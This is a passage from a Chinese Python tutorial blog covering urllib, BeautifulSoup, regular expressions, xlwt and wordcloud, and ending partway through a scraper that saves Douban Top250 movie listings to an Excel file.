class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>  <span class="token comment">#提交的表单数据并根据utf-8来编码</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#响应头部信息</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheader<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">#获取头部信息内的某个键值对</span><span class="token comment"># 自定义请求头部</span>url<span class="token operator">=</span><span class="token string">"http://httpbin.org/post"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span><span class="token punctuation">&#125;</span>data<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"hello"</span><span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token punctuation">)</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bs4库"><a href="#bs4库" class="headerlink" title="bs4库"></a>bs4库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./baidu.html"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>html<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>bs<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>            <span class="token comment">#解析谁，用什么解析器</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>a<span class="token punctuation">.</span>attrs<span class="token punctuation">)</span>               <span class="token comment">#标签的所有属性</span><span class="token comment"># 遍历文档</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>head<span class="token punctuation">.</span>contents<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>head<span class="token punctuation">.</span>contents<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 搜索文档</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token keyword">import</span> ret_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"mm"</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>href<span class="token operator">=</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>         <span class="token comment">#注意下划线</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">"hao123"</span><span class="token punctuation">)</span>       <span class="token comment">#查找标签内容</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"hao123"</span><span class="token punctuation">,</span><span class="token string">"地图"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>limit<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>         <span class="token comment">#前3条</span><span class="token comment"># CSS选择器</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment">#通过标签查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">".classa"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#通过类名查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"#id1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">#通过id查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"a[class='inside-a']"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#通过标签的属性查找</span><span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">"head > title"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#head标签里的title标签</span>t_list<span class="token operator">=</span>bs<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">".mnav ~ .bri"</span><span class="token punctuation">)</span>        <span class="token comment">#属性为.mnav的兄弟标签，即与属性为.mnav在同一级下的属性为.bri的标签</span><span class="token keyword">print</span><span class="token punctuation">(</span>t_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><table><thead><tr><th align="center">操作符</th><th align="center">说明</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">表示任何单个字符</td><td align="center"></td></tr><tr><td align="center">[     ]</td><td align="center">字符集，对单个字符给出取值范围</td><td align="center">[abc]表示a、b、c，[a-z]表示a到z单个字符</td></tr><tr><td align="center">[^  ]</td><td align="center">非字符集，给出排除范围</td><td align="center">[^abc]表示非a、非b、非c的单个字符</td></tr><tr><td align="center">*</td><td align="center">前一个字符0次或无限次扩展</td><td align="center">abc*表示ab、abc、abcc、abccc等</td></tr><tr><td align="center">+</td><td align="center">前一个字符1次或无限次扩展</td><td align="center">abc+表示abc、abcc、abccc等</td></tr><tr><td align="center">？</td><td align="center">前一个字符0次或1次扩展</td><td align="center">abc?表示ab、abc</td></tr><tr><td align="center">|</td><td align="center">左右表达式任意一个</td><td align="center">abc|def表示abc、def</td></tr><tr><td align="center">{m}</td><td align="center">扩展前一个字符m次</td><td align="center">ab{2}c表示abbc</td></tr><tr><td align="center">{m,n}</td><td align="center">扩展前一个字符m至n次</td><td align="center">ab{1,2}c表示abc、abbc</td></tr><tr><td align="center">^</td><td align="center">匹配字符串开头</td><td align="center">^abc表示abc且在一个字符串的开头</td></tr><tr><td align="center">$</td><td align="center">匹配字符串结尾</td><td align="center">abc$表示abc且在一个字符串的结尾</td></tr><tr><td align="center">(  )</td><td align="center">分组标记，内部只能使用 | 操作符</td><td align="center">(abc)表示abc，(abc|def)表示abc、def</td></tr><tr><td align="center">\d</td><td align="center">数字，等价于[0-9]</td><td align="center"></td></tr><tr><td align="center">\w</td><td align="center">单词字符，等价于[A-Za-z0-9_] (包含下划线)</td><td align="center"></td></tr></tbody></table><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">re.search()</td><td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td></tr><tr><td align="center">re.match()</td><td align="center">从一个字符串的开始位置起匹配正则表达式，返回match对象</td></tr><tr><td align="center">re.findall()</td><td align="center">搜索字符串，以列表类型返回全部能匹配的字串</td></tr><tr><td align="center">re.split()</td><td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td align="center">re.finditer()</td><td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td></tr><tr><td align="center">re.sub()</td><td align="center">在一个字符串中替换所有匹配正则表达式的字串，返回替换后的字符串</td></tr></tbody></table><table><thead><tr><th align="center">修饰符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">re.I</td><td align="center">使匹配对大小写不敏感</td></tr><tr><td align="center">re.L</td><td align="center">做本地化识别匹配</td></tr><tr><td align="center">re.M</td><td align="center">多行匹配，影响^和$</td></tr><tr><td align="center">re.S</td><td align="center">使.匹配包括换行在内的所有字符</td></tr><tr><td align="center">re.U</td><td align="center">根据Unicode字符集解析字符，影响\w,\W,\b,\B</td></tr><tr><td align="center">re.X</td><td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> repat<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">)</span>m<span class="token operator">=</span>pat<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>       <span class="token comment">#返回第一个匹配成功的位置</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>   <span class="token comment">#第一个参数为规则，第二个参数为被校验的对象</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"CBCAADDAA"</span><span class="token punctuation">)</span>  <span class="token comment">#返回列表，匹配所有位置</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">,</span><span class="token string">"abcdacsd"</span><span class="token punctuation">)</span>    <span class="token comment">#找到a用A替换</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>建议在正则表达式中，被比较的字符串前面加上r，不用担心转义字符的问题</p></blockquote><h2 id="xlwt库"><a href="#xlwt库" class="headerlink" title="xlwt库"></a>xlwt库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> xlwtworkbook<span class="token operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'sheet1'</span><span class="token punctuation">)</span>worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'hello'</span><span class="token punctuation">)</span>    <span class="token comment">#行，列，内容</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string"> * </span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'a.xls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wordcloud库"><a href="#wordcloud库" class="headerlink" title="wordcloud库"></a>wordcloud库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jieba<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordCloud<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> sqlite3con <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>cur <span class="token operator">=</span> con<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">'select introdu from movie250'</span>data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>text <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>    text <span class="token operator">+=</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>cut <span class="token operator">=</span> jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>text<span class="token punctuation">)</span>string <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cut<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'static/assets/img/tree.jpg'</span><span class="token punctuation">)</span>img_array <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>img<span class="token punctuation">)</span>wc <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>    background_color<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span>    mask<span class="token operator">=</span>img_array<span class="token punctuation">,</span>    font_path<span class="token operator">=</span><span class="token string">"msyh.ttc"</span><span class="token punctuation">)</span>wc<span class="token punctuation">.</span>generate_from_text<span class="token punctuation">(</span>string<span class="token punctuation">)</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wc<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token string">'off'</span><span class="token punctuation">)</span><span class="token comment"># plt.show()</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'static/assets/img/word.jpg'</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250存入Excel完整爬虫代码"><a href="#豆瓣Top250存入Excel完整爬虫代码" class="headerlink" title="豆瓣Top250存入Excel完整爬虫代码"></a>豆瓣Top250存入Excel完整爬虫代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> xlwt<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl<span class="token operator">=</span><span class="token string">"https://movie.douban.com/top250?start="</span>    data_list<span class="token operator">=</span>getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    savepath<span class="token operator">=</span><span class="token string">"top250.xls"</span>    saveData<span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span>findLink<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;a href="(.*?)">'</span><span class="token punctuation">)</span>                    <span class="token comment">#影片详情的匹配规则</span>findImgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img.*src="(.*?)"'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#影片图片，忽略换行符</span>findTitle<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="title">(.*)&lt;/span>'</span><span class="token punctuation">)</span>    <span class="token comment">#影片片名</span>findRating<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="rating_num" property="v:average">(.*)&lt;/span>'</span><span class="token punctuation">)</span> <span class="token comment">#影片评分</span>findJudge<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span>(\d*)人评价&lt;/span>'</span><span class="token punctuation">)</span>            <span class="token comment">#评价人数               </span>findInduct<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="inq">(.*)&lt;/span>'</span><span class="token punctuation">)</span>     <span class="token comment">#影片概况</span>findBd<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;p class="">(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#详细信息如导演，演员等</span><span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span>    <span class="token punctuation">&#125;</span>    request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html<span class="token operator">=</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span>baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>        html<span class="token operator">=</span>askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment">#保存一部电影的所有信息</span>            item<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>            link<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findLink<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#影片详情的超链接</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>            imgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findImgSrc<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span>            titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findTitle<span class="token punctuation">,</span>item<span class="token punctuation">)</span>    <span class="token comment">#片名可能只有一个中文名，没有外文名</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                chinese_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chinese_title<span class="token punctuation">)</span>                foreign_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#去除无关符号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>foreign_title<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>                <span class="token comment">#外文名留空</span>            rating<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findRating<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rating<span class="token punctuation">)</span>            judgeNum<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findJudge<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>judgeNum<span class="token punctuation">)</span>            Induct<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findInduct<span class="token punctuation">,</span>item<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Induct<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                Induct<span class="token operator">=</span>Induct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"。"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Induct<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findBd<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"&lt;br(\s+)?/>(\s+)?"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Bd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#去掉前后的空格</span>            data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data_list<span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    workbook<span class="token 